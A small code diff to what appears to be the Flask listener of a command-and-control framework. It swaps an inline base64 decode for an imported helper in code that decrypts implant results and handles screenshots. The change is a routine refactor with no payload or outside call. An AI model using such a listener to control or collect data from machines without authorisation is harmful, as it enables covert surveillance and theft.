@@ -14,6 +14,8 @@ import hashlib
 import io
 import json
 
+from .strings import decode_base64_blob
+
 # Parse configuration from 'config.toml'
 try:
     listenerType = config["listener"]["type"]
@@ -284,7 +286,7 @@ def flaskListener(xor_key):
         if np is not None:
             if userAgent == flask.request.headers.get("User-Agent"):
                 res = json.loads(decryptData(data["data"], np.cryptKey))
-                data = base64.b64decode(res["result"]).decode("utf-8")
+                data = decode_base64_blob(res["result"])
 
                 # Handle Base64-encoded, gzipped PNG file (screenshot)
                 if data.startswith("H4sIAAAA"):
